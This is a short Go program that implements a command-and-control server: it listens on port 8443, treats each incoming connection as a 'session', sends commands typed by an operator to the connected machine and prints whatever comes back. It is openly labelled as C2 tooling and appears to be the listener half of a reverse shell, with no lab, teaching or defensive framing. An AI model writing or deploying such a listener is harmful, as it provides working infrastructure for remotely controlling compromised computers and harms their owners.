package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
)

var (
	activeSession net.Conn
	mu            sync.Mutex
)

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:8443")
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	fmt.Println("[C2] Listening on 0.0.0.0:8443")
	go acceptLoop(listener)

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[C2] > ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "" {
			continue
		}

		mu.Lock()
		sess := activeSession
		mu.Unlock()

		if sess == nil {
			fmt.Println("[C2] No active session")
			continue
		}

		sess.Write([]byte(cmd + "\n"))
	}
}

func acceptLoop(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		mu.Lock()
		if activeSession != nil {
			activeSession.Close()
		}
		activeSession = conn
		mu.Unlock()

		fmt.Printf("[C2] New session: %s\n", conn.RemoteAddr().String())
		go handleSession(conn)
	}
}

func handleSession(conn net.Conn) {
	defer func() {
		conn.Close()
		mu.Lock()
		if activeSession == conn {
			activeSession = nil
		}
		mu.Unlock()
		fmt.Printf("[C2] Session closed: %s\n", conn.RemoteAddr().String())
	}()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "ready" {
			continue
		}
		fmt.Printf("%s\n", line)
	}
}
